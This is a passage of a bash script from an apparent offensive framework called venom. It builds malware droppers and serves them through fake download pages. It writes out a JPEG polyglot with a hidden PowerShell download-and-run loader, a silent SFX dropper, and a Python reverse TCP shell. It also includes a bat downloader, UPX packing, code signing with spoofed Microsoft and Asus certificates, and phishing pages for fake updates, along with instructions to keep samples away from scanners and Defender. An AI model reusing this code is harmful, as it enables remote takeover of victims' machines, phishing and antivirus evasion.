gnome-terminal --title="Building SSL certificates" --geometry=90x21 --wait -- sh -c "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days $days -nodes -subj \"/C=$contry/ST=$LTDR/L=$localidade/O=Global Security/OU=IT Department/CN=$CN\"" > /dev/null 2>&1
if [ -e cert.pem ]; then
   echo "${BlueF}[☠]${white} venom/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 2
else
   echo "${BlueF}[☠]${white} venom/output/key.pem + cert.pem ([${RedF}FAIL${white}])${white} ..";sleep 2
fi
cd $IPATH


## BUILD DROPPER (to download/execute our agent.ps1).
echo "${BlueF}[☠]${white} Building WinRar (sfx) binary dropper ..${white}";sleep 2
ArCh=$(cat $IPATH/settings | egrep -m 1 "SYSTEM_ARCH" | cut -d '=' -f2) > /dev/null 2>&1 # sellected arch to use in Trojanizer.sh
Image_path=$(zenity --title "☠ LEGIT IMAGE JPG (jpeg) ☠" --filename=$IPATH --file-selection --text "chose one legit image.jpeg") > /dev/null 2>&1


cd $IPATH/bin/powerglot
## use powerglot to embbebed payload into image.jpeg
sudo echo "powershell -WindowStyle Hidden iwr -Uri \"http://$lhost/Client.ps1\" -OutFile \"\$Env:TMP\\\Client.ps1\";powershell -WindowStyle Hidden -File \$Env:TMP\\\Client.ps1" > MyMeterpreter.ps1
echo "${BlueF}[☠]${white} powerglot: embbebig client into Image!"${Reset};sleep 2
python3 powerglot.py -o MyMeterpreter.ps1 $Image_path $Drop.jpeg
mkdir work;cp $Drop.jpeg $IPATH/bin/powerglot/work/$Drop.jpeg



#
# build SFX configuration file (bin/xsf.conf)
#
RandomMe="powershell -WindowStyle Hidden cat $Drop.jpeg|powershell" ## yousef bug report!
mypill="powershell -WindowStyle Hidden iwr -Uri \"http://raw.githubusercontent.com/r00t-3xp10it/redpill/main/redpill.ps1\" -OutFile \"\$Env:TMP\\\redpill.ps1\""
echo "; The sfx archive title" > $IPATH/bin/powerglot/xsf.conf
echo "Title=$Drop.jpeg auto-extracter" >> $IPATH/bin/powerglot/xsf.conf
echo "; The path to the setup executables" >> $IPATH/bin/powerglot/xsf.conf
echo "Setup=$RandomMe" >> $IPATH/bin/powerglot/xsf.conf
echo "Setup=$mypill" >> $IPATH/bin/powerglot/xsf.conf
echo "; Use semi-silent mode" >> $IPATH/bin/powerglot/xsf.conf
echo "Silent=1" >> $IPATH/bin/powerglot/xsf.conf
echo "; Overwrite any existing files" >> $IPATH/bin/powerglot/xsf.conf
echo "Overwrite=1" >> $IPATH/bin/powerglot/xsf.conf
echo ${BlueF}[☆]${white}" Build SFX configuration file: ${GreenF}done!"${Reset};
sleep 2


cd $IPATH/bin/powerglot/work
## Using winrar to build sfx archive
echo "${BlueF}[☠]${white} Running winrar to build sfx archive!"${Reset};sleep 2
$arch "$WINE_WinRAR" a -c -z$IPATH/bin/powerglot/xsf.conf -r- -ed -s -sfx -y $Drop > /dev/null 2>&1
mv $IPATH/bin/powerglot/work/$Drop.exe $IPATH/output/$Drop.exe


cd $IPATH/output/
zip $Drop.zip $Drop.exe > /dev/nul 2>&1 ## Zip archive
## Building the Download Webpage Sellected.
echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2)"${Reset};sleep 2
phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" TRUE "Mega-Upload (default)" FALSE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
if [ "$phish" = "Mega-Upload (default)" ]; then
    cd $IPATH/templates/phishing
   sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
   mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
else
   cd $IPATH/templates/phishing/firefox
   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > Download.html
   mv Download.html $ApAcHe/Download.html > /dev/nul 2>&1
   cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
fi


cd $IPATH/output
## Copy ALL files to apache2 webroot
echo "${BlueF}[☠]${white} Porting ALL required files to apache2"${Reset};sleep 2
cp $IPATH/output/Client.ps1 $ApAcHe/Client.ps1 > /dev/nul 2>&1
cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
cd $IPATH


cd $IPATH/output
## Print attack vector on terminal
echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver";sleep 2
echo "${BlueF}---"
echo "${BlueF}- ${RedBg}SEND THE URL GENERATED TO TARGET HOST${Reset}"
if [ "$phish" = "Mega-Upload (default)" ]; then
   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/MegaUpload.html"
else
   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/Download.html"
fi
echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
echo "${BlueF}---"${Reset};
echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
read odf
## START NETCAT HANDLER ON SELLECTED PORT NUMBER
#x term -T " OPENSSL LISTENER => $lhost:$lport" -geometry 110x23 -e "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
gnome-terminal --title="JPEG POLYGLOT RCE LISTENER => $lhost:$lport" --geometry=90x21 --wait -- sh -c "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ShellOptions: powershell -file redpill.ps1 -help parameters;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" > /dev/null 2>&1


## Clean old files.
echo "${BlueF}[☠]${white} Please Wait, cleaning old files ..${white}";sleep 2
sudo rm $IPATH/output/Client.ps1 > /dev/nul 2>&1
sudo rm $IPATH/output/cert.pem > /dev/nul 2>&1
sudo rm $IPATH/output/key.pem > /dev/nul 2>&1
sudo rm $IPATH/output/$Drop.exe > /dev/nul 2>&1
sudo rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
sudo rm $IPATH/output/.ps1 > /dev/nul 2>&1
sudo rm $IPATH/bin/powerglot/$Drop.jpeg > /dev/nul 2>&1
sudo rm $IPATH/bin/powerglot/MyMeterpreter.ps1 > /dev/nul 2>&1
sudo rm $IPATH/bin/powerglot/xsf.conf > /dev/nul 2>&1
sudo rm $ApAcHe/Client.ps1 > /dev/nul 2>&1
sudo rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
sudo rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
sudo rm $ApAcHe/Download.html > /dev/nul 2>&1
sudo rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
sudo rm -r $IPATH/bin/powerglot/work > /dev/nul 2>&1
cd $IPATH

sh_menu
}




# -------------------------------------------------
#         - Shepard bind tcp shell -
# -------------------------------------------------
sh_evasion9 () {
Colors;


## Make sure all module dependencies are satisfied.
# Make sure python depedencies are installed
audit=$(python3 --version) > /dev/null 2>&1
if [ "$?" -ne "0" ]; then
   echo "${RedBg}[ERROR] python3 installation not found.${white}";sleep 2
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing python3.6"
   echo "" && sudo apt-get update && apt-get install python3.6 && echo "" && clear
fi



## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
echo "---"
echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
echo "- Please Dont test samples on Virus Total or on similar"${Reset};
echo "- online scanners, because that will shorten the payload life."${Reset};
echo "- And in testings also remmenber to stop the windows defender"${Reset};
echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
echo "---"
sleep 1


## Store User Inputs (bash variable declarations)..
rhost=$(zenity --title="☠ Enter RHOST (target ip) ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
dropper=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nRemark: shepbind_serv ( raw client ) does not\ndownload redpill.ps1 or add a firewall exception rule." --radiolist --column "Pick" --column "Option" TRUE "MEdgeUpdaterService" FALSE "FirefoxUpdaterService" FALSE "ChromeUpdaterService" FALSE "shepbind_serv" --width 360 --height 260) > /dev/null 2>&1

## Setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$rhost" ]; then rhost="$IP";fi
if [ -z "$dropper" ]; then dropper="MEdgeUpdaterService";fi


## Display final settings to user.
echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 1
echo ${BlueF}"---"
cat << !
    RPORT    : 6006
    RHOST    : $rhost
    LOLBin   : Invoke-WebRequest
    AGENT    : $IPATH/output/shepbind_serv.exe
    DROPPER  : $IPATH/output/$dropper.exe
    UPLOADTO : %tmp%
!
echo "---"
sleep 1


cd $IPATH/output
mkdir work
echo "${BlueF}[☠]${white} Writting bind shell to output."${Reset};sleep 2
cp $IPATH/bin/shepard/shepardsbind_recv.py $IPATH/output/shepardsbind_recv.py > /dev/null 2>&1 ## server - output
cp $IPATH/bin/shepard/$dropper.exe $IPATH/output/$dropper.exe > /dev/null 2>&1                 ## dropper - output
cd $IPATH/output/work
echo "${BlueF}[☠]${white} Zipping $dropper.exe (Zip)"${Reset};sleep 2
cp $IPATH/bin/shepard/$dropper.exe $IPATH/output/work/$dropper.exe > /dev/null 2>&1 ## Zip archive           
zip $dropper.zip $dropper.exe > /dev/nul 2>&1 ## Zip archive
mv $dropper.zip $IPATH/output/$dropper.zip > /dev/null 2>&1 ## Zip archive - output
rm -r $IPATH/output/work/ > /dev/null 2>&1


cd $IPATH/output
## Building the Download Webpage Sellected.
echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2)"${Reset};sleep 2
phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" TRUE "Mega-Upload (default)" FALSE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
if [ "$phish" = "Mega-Upload (default)" ]; then
    cd $IPATH/templates/phishing
   sed "s|NaM3|http://$lhost/$dropper.zip|g" mega.html > MegaUpload.html
   mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
else
   cd $IPATH/templates/phishing/firefox
   sed "s|NaM3|http://$lhost/$dropper.zip|g" FakeUpdate.html > Download.html
   mv Download.html $ApAcHe/Download.html > /dev/nul 2>&1
   cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
fi


cd $IPATH/output
## Copy ALL files to apache2 webroot
echo "${BlueF}[☠]${white} Porting ALL required files to apache2"${Reset};sleep 2
cp $IPATH/output/$dropper.zip $ApAcHe/$dropper.zip > /dev/nul 2>&1


## Print attack vector on terminal
echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver";sleep 2
echo "${BlueF}---"
echo "${BlueF}- ${RedBg}SEND THE URL GENERATED TO TARGET HOST${Reset}"
if [ "$phish" = "Mega-Upload (default)" ]; then
   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/MegaUpload.html"
else
   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/Download.html"
fi
echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
echo "${BlueF}---"${Reset};
echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
read odf


cd $IPATH/output
## START SHEPARD HANDLER ON SELLECTED PORT NUMBER
gnome-terminal --title="SHEPARD BIND SHELL HANDLER" --geometry=90x21 --wait -- sh -c "echo waiting for conections ..;sudo python3 shepardsbind_recv.py $rhost" > /dev/null 2>&1


## Clean old files.
echo "${BlueF}[☠]${white} Please Wait, cleaning old files ..${white}";sleep 2
sudo rm $IPATH/output/shepardsbind_recv.py > /dev/nul 2>&1
sudo rm $IPATH/output/$dropper.exe > /dev/nul 2>&1
sudo rm $IPATH/output/$dropper.zip > /dev/nul 2>&1
sudo rm $IPATH/output/.ps1 > /dev/nul 2>&1
sudo rm $ApAcHe/$dropper.zip > /dev/nul 2>&1
sudo rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
sudo rm $ApAcHe/Download.html > /dev/nul 2>&1
sudo rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
cd $IPATH

sh_menu
}



# NOT IN USE
sh_evasion444 () {
Colors;

## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
echo "---"
echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
echo "- Please Dont test samples on Virus Total or on similar"${Reset};
echo "- online scanners, because that will shorten the payload life."${Reset};
echo "- And in testings also remmenber to stop the windows defender"${Reset};
echo "- from sending samples to \$Microsoft.."${Reset};
echo "---"
sleep 2

lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
NaM=$(zenity --title="☠ Enter FILENAME ☠" --text "example: Rel1k" --entry --width 300) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$NaM" ]; then NaM="Rel1k";fi

## display final settings to user
echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
echo "${BlueF}---"
cat << !
    LPORT    : $lport
    LHOST    : $lhost
    LOLBin   : powershell DownloadFile()
    DROPPER  : $IPATH/output/$NaM.bat
    AGENT    : $IPATH/output/$NaM.exe
!
echo "---${white}"


## BUILD LAUNCHER
echo "${BlueF}[☠]${white} Building Obfuscated bat dropper ..${white}";sleep 2
echo "@echo off" > $IPATH/output/Launcher.bat
echo "echo Please Wait, Installing Software .." >> $IPATH/output/Launcher.bat
echo "powershell -w 1 -C \"(New-Object Net.WebClient).DownloadFile('https://$lhost/$NaM.exe', '$NaM.exe')\" && Start $NaM.exe" >> $IPATH/output/Launcher.bat
echo "exit" >> $IPATH/output/Launcher.bat
cd $IPATH/output
mv Launcher.bat $NaM.bat
cd $IPATH


## Reverse TCP shell in python (ReliK Inspired)
echo "${BlueF}[☠]${white} Writting TCP reverse shell to output .."${Reset};
sleep 2
echo "#!/usr/bin/python" > $IPATH/output/Client_Shell.py
echo "# Simple Reverse TCP Shell Written by: Dave Kennedy (ReL1K)" >> $IPATH/output/Client_Shell.py
echo "# Copyright 2018 TrustedSec, LLC. All rights reserved." >> $IPATH/output/Client_Shell.py
echo "##" >> $IPATH/output/Client_Shell.py
echo "" >> $IPATH/output/Client_Shell.py
echo "import socket" >> $IPATH/output/Client_Shell.py
echo "import subprocess" >> $IPATH/output/Client_Shell.py
echo "" >> $IPATH/output/Client_Shell.py
echo "VOODOO = '$lhost'    # The remote lhost ip addr" >> $IPATH/output/Client_Shell.py
echo "KUNGFU = $lport               # The same port as used by the server" >> $IPATH/output/Client_Shell.py
echo "" >> $IPATH/output/Client_Shell.py
echo "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)" >> $IPATH/output/Client_Shell.py
echo "s.connect((VOODOO, KUNGFU))" >> $IPATH/output/Client_Shell.py
echo "while 1:" >> $IPATH/output/Client_Shell.py
echo "    data = s.recv(1024)" >> $IPATH/output/Client_Shell.py
echo "    proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)" >> $IPATH/output/Client_Shell.py
echo "    stdout_value = proc.stdout.read() + proc.stderr.read()" >> $IPATH/output/Client_Shell.py
echo "    s.send(stdout_value)" >> $IPATH/output/Client_Shell.py
echo "# quit out afterwards and kill socket" >> $IPATH/output/Client_Shell.py
echo "s.close()" >> $IPATH/output/Client_Shell.py
## Rename python client
cp $IPATH/output/Client_Shell.py $IPATH/output/$NaM.py


## COMPILE/CHANGE EXE ICON (pyinstaller)
echo "${BlueF}[☠]${white} Changing $NaM.exe icon (pyinstaller) .."${Reset};
sleep 2

    ## Icon sellection
    IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "dropbox.ico" FALSE "Microsoft-Excel.ico" FALSE "Microsoft-Word.ico" FALSE "Steam-logo.ico" FALSE "Windows-black.ico" FALSE "Windows-Logo.ico" FALSE "Windows-Store.ico" FALSE "Input your own icon" --width 330 --height 330) > /dev/null 2>&1
    if [ "$IcOn" = "Input your own icon" ]; then
      ImR=$(zenity --title "☠ ICON REPLACEMENT ☠" --filename=$IPATH --file-selection --text "chose icon.ico to use") > /dev/null 2>&1
      PaTh="$ImR"
    else
      PaTh="$IPATH/bin/icons/$IcOn"
    fi

    ## Compile and change icon
    cd $IPATH/output
    xterm -T " PYINSTALLER " -geometry 110x23 -e "su $user -c '$arch c:/$PyIn/Python.exe c:/$PiWiN/pyinstaller.py --noconsole -i $PaTh --onefile $IPATH/output/Client_Shell.py'"

    ## clean pyinstaller directory
    mv $IPATH/output/dist/Client_Shell.exe $IPATH/output/Client_Shell.exe > /dev/null 2>&1
    rm $IPATH/output/*.spec > /dev/null 2>&1
    rm $IPATH/output/*.log > /dev/null 2>&1
    rm -r $IPATH/output/dist > /dev/null 2>&1
    rm -r $IPATH/output/build > /dev/null 2>&1


## check UPX dependencie
upx_packer=`which upx`
if ! [ "$?" -eq "0" ]; then
  echo "${RedF}[x]${white} UPX Packer not found, installing .."${Reset};sleep 3
  echo "" && sudo apt-get install upx-ucl && echo ""
else
  ## AV evasion (pack binary with UPX)
  echo "${BlueF}[☠]${white} Packing final executable with UPX .."${Reset};sleep 2
  upx -9 -v -o $NaM.exe Client_Shell.exe > /dev/null 2>&1
fi


## Make sure CarbonCopy dependencies are installed
ossl_packer=`which osslsigncode`
if ! [ "$?" -eq "0" ]; then
  echo "${RedF}[x]${white} osslsigncode Package not found, installing .."${Reset};sleep 2
  echo "" && sudo apt-get install osslsigncode && pip3 install pyopenssl && echo ""
fi


## SIGN EXECUTABLE (paranoidninja - CarbonCopy)
echo "${BlueF}[☠]${white} Sign Executable for AV Evasion (CarbonCopy) .."${Reset};sleep 2
# random produces a number from 1 to 6
conv=$(cat /dev/urandom | tr -dc '1-6' | fold -w 1 | head -n 1)
# if $conv number output 'its small than' number 3 ...
if [ "$conv" "<" "3" ]; then SSL_domain="www.microsoft.com"; else SSL_domain="www.asus.com"; fi
echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate: $SSL_domain"${Reset};sleep 2
cd $IPATH/obfuscate
xterm -T "VENOM - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$NaM.exe $IPATH/output/signed-$NaM.exe && sleep 2"
mv $IPATH/output/signed-$NaM.exe $IPATH/output/$NaM.exe
rm -r certs > /dev/nul 2>&1
chmod +x $IPATH/output/$NaM.exe > /dev/nul 2>&1
chmod +x $IPATH/output/$NaM.py > /dev/nul 2>&1
cd $IPATH/


## Copy files to apache2 webroot
echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
cp $IPATH/output/$NaM.exe $ApAcHe/$NaM.exe > /dev/nul 2>&1
cp $IPATH/output/$NaM.bat $ApAcHe/$NaM.bat > /dev/nul 2>&1
rm $IPATH/output/Client_Shell.exe > /dev/nul 2>&1
rm $IPATH/output/Client_Shell.py > /dev/nul 2>&1


## Phishing webpage
cd $IPATH/templates/phishing
sed "s|NaM3|http://$lhost/$NaM.bat|g" mega.html > mega1.html
mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
cd $IPATH


## Print attack vector on terminal
echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
echo "${BlueF}---"
echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
echo "${BlueF}---"${Reset};
echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
read odf
rm $IPATH/output/$NaM.py > /dev/nul 2>&1
## START HANDLER
xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"


## Clean old files
echo "${BlueF}[☠]${white} Please Wait,cleaning old files .."${Reset};sleep 2
rm $ApAcHe/$NaM.exe > /dev/nul 2>&1
rm $ApAcHe/$NaM.bat > /dev/nul 2>&1
rm $ApAcHe/mega1.html > /dev/nul 2>&1
sh_menu
}




# ------------------------------
# SUB-MENUS (payload categories)
# ------------------------------
sh_unix_menu () {
echo ${BlueF}[☠]${white} Loading ${YellowF}[Unix]${white} agents ..${Reset};
sleep 2
cat << !


    AGENT Nº1:
    ──────────
    TARGET SYSTEMS     : Linux|Bsd|Solaris|OSx
    SHELLCODE FORMAT   : C
    AGENT EXTENSION    : ---
    AGENT EXECUTION    : sudo ./agent
    DETECTION RATIO    : http://goo.gl/XXSG7C

    AGENT Nº2:
    ──────────
    TARGET SYSTEMS     : Linux|Bsd|solaris
    SHELLCODE FORMAT   : SH|PYTHON
    AGENT EXTENSION    : DEB
    AGENT EXECUTION    : sudo dpkg -i agent.deb
    DETECTION RATIO    : https://goo.gl/RVWKff

    AGENT Nº3:
    ──────────
    TARGET SYSTEMS     : Linux|Bsd|Solaris
    SHELLCODE FORMAT   : ELF
    AGENT EXTENSION    : ELF
    AGENT EXECUTION    : sudo ./agent.elf
    DETECTION RATIO    : https://goo.gl/YpyYwk

    AGENT Nº4:
    ──────────
    TARGET SYSTEMS     : Linux (htop trojan)
    SHELLCODE FORMAT   : C
    AGENT EXTENSION    : DEB
    AGENT EXECUTION    : sudo ./agent.deb
    DETECTION RATIO    : https://goo.gl/naohaainda

    AGENT Nº5:
    ──────────
    TARGET SYSTEMS     : Linux (mp4 trojan)
    SHELLCODE FORMAT   : C
    AGENT EXTENSION    : MP4
    AGENT EXECUTION    : sudo ./ricky-video.mp4
    DETECTION RATIO    : https://goo.gl/naohaainda


    ╔═════════════════════════════════════════════════════════════╗
    ║   M    - Return to main menu                                ║
    ║   E    - Exit venom Framework                               ║
    ╚═════════════════════════════════════════════════════════════╝


!
echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
read choice
case $choice in
1) sh_shellcode1 ;;
2) sh_shellcode20 ;;
3) sh_elf ;;
4) sh_debian ;;
5) sh_mp4_trojan ;;
m|M) sh_menu ;;
e|E) sh_exit ;;
*) echo ${RedF}[x] "[$choice]"${white}: is not a valid Option${Reset}; sleep 2; clear; sh_unix_menu ;;
esac
}


# ------------------------
# MICROSOFT BASED PAYLOADS
# ------------------------
sh_microsoft_menu () {
echo ${BlueF}[☠]${white} Loading ${YellowF}[Microsoft]${white} agents ..${Reset};
sleep 2
cat << !


    AGENT Nº1:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : C (uuid obfuscation)
    AGENT EXTENSION    : DLL|CPL
    AGENT EXECUTION    : rundll32.exe agent.dll,main | press to exec (cpl)
    DETECTION RATIO    : http://goo.gl/NkVLzj

    AGENT Nº2:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : DLL
    AGENT EXTENSION    : DLL|CPL
    AGENT EXECUTION    : rundll32.exe agent.dll,main | press to exec (cpl)
    DETECTION RATIO    : http://goo.gl/dBGd4x

    AGENT Nº3:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : C
    AGENT EXTENSION    : PY(pyherion|NXcrypt)|EXE
    AGENT EXECUTION    : python agent.py | press to exec (exe)
    DETECTION RATIO    : https://goo.gl/7rSEyA (.py)
    DETECTION RATIO    : https://goo.gl/WJ9HbD (.exe)

    AGENT Nº4:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : C
    AGENT EXTENSION    : EXE
    AGENT EXECUTION    : press to exec (exe)
    DETECTION RATIO    : https://goo.gl/WpgWCa

    AGENT Nº5:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : PSH-CMD
    AGENT EXTENSION    : EXE
    AGENT EXECUTION    : press to exec (exe)
    DETECTION RATIO    : https://goo.gl/MZnQKs

    AGENT Nº6:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : C
    AGENT EXTENSION    : RB
    AGENT EXECUTION    : ruby agent.rb
    DETECTION RATIO    : https://goo.gl/eZkoTP

    AGENT Nº7:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : MSI-NOUAC
    AGENT EXTENSION    : MSI
    AGENT EXECUTION    : msiexec /quiet /qn /i agent.msi
    DETECTION RATIO    : https://goo.gl/zcA4xu

    AGENT Nº8:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : POWERSHELL
    AGENT EXTENSION    : BAT
    AGENT EXECUTION    : press to exec (bat)
    DETECTION RATIO    : https://goo.gl/BYCUhb

    AGENT Nº9:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : HTA-PSH
    AGENT EXTENSION    : HTA
    AGENT EXECUTION    : http://$IP
    DETECTION RATIO    : https://goo.gl/mHC72C

    AGENT Nº10:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : PSH-CMD
    AGENT EXTENSION    : PS1 + BAT
    AGENT EXECUTION    : press to exec (bat)
    DETECTION RATIO    : https://goo.gl/GJHu7o

    AGENT Nº11:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : PSH-CMD
    AGENT EXTENSION    : BAT
    AGENT EXECUTION    : press to exec (bat)
    DETECTION RATIO    : https://goo.gl/nY2THB

    AGENT Nº12:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : VBS
    AGENT EXTENSION    : VBS
    AGENT EXECUTION    : press to exec (vbs)
    DETECTION RATIO    : https://goo.gl/PDL4qF

    AGENT Nº13:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : PSH-CMD
    AGENT EXTENSION    : VBS
    AGENT EXECUTION    : press to exec (vbs)
    DETECTION RATIO    : https://goo.gl/sd3867

    AGENT Nº14:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : PSH-CMD|C
    AGENT EXTENSION    : PDF
    AGENT EXECUTION    : press to exec (pdf)
    DETECTION RATIO    : https://goo.gl/N1VTPu

    AGENT Nº15:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : EXE-SERVICE
    AGENT EXTENSION    : EXE
    AGENT EXECUTION    : sc start agent.exe
    DETECTION RATIO    : https://goo.gl/dCYdCo

    AGENT Nº16:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : C + PYTHON (uuid obfuscation)
    AGENT EXTENSION    : EXE
    AGENT EXECUTION    : press to exec (exe)
    DETECTION RATIO    : https://goo.gl/HgnSQW

    AGENT Nº17:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : C + AVET (obfuscation)
    AGENT EXTENSION    : EXE
    AGENT EXECUTION    : press to exec (exe)
    DETECTION RATIO    : https://goo.gl/kKJuQ5

    AGENT Nº18:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : SHELLTER (trojan embedded)
    AGENT EXTENSION    : EXE
    AGENT EXECUTION    : press to exec (exe)
    DETECTION RATIO    : https://goo.gl/9MtQjM

    AGENT Nº19:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : CSHARP
    AGENT EXTENSION    : XML + BAT
    AGENT EXECUTION    : press to exec (bat)
    DETECTION RATIO    : https://goo.gl/coKiKx

    AGENT Nº20:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : PSH-CMD|EXE
    AGENT EXTENSION    : BAT|EXE
    AGENT EXECUTION    : http://$IP/EasyFileSharing.hta
    DETECTION RATIO    : https://goo.gl/R8UNW3

    AGENT Nº21:
    ───────────
    DESCRIPTION        : ICMP (ping) Reverse Shell
    TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
    AGENT EXTENSION    : EXE
    DROPPER EXTENSION  : BAT
    AGENT EXECUTION    : http://$IP/dropper.bat
    DISCLOSURE BY      : @Daniel Compton (icmpsh.exe)

    ╔═════════════════════════════════════════════════════════════╗
    ║   M    - Return to main menu                                ║
    ║   E    - Exit venom Framework                               ║
    ╚═════════════════════════════════════════════════════════════╝


!
echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
read choice
case $choice in
1) sh_shellcode2 ;;
2) sh_shellcode3 ;;
3) sh_shellcode4 ;;
4) sh_shellcode5 ;;
5) sh_shellcode6 ;;
6) sh_shellcode7 ;;
7) sh_shellcode8 ;;
8) sh_shellcode9 ;;
9) sh_shellcode10 ;;
10) sh_shellcode11 ;;
11) sh_shellcode12 ;;
12) sh_shellcode13 ;;
13) sh_shellcode14 ;;
14) sh_shellcode15 ;;
15) sh_shellcode22 ;;
16) sh_shellcode23 ;;
17) sh_shellcode24 ;;
18) sh_shellcode25 ;;
19) sh_shellcodecsharp ;;
20) sh_certutil ;;
21) sh_icmp_shell ;;
m|M) sh_menu ;;
e|E) sh_exit ;;
*) echo ${RedF}[x] "[$choice]"${white}: is not a valid Option${Reset}; sleep 2; clear; sh_microsoft_menu ;;
esac
}



# ---------------
# MULTI-ARCH MENU
# ---------------
sh_multi_menu () {
echo ${BlueF}[☠]${white} Loading ${YellowF}[Multi-OS]${white} agents ..${Reset};
sleep 2
cat << !


    AGENT Nº1:
    ──────────
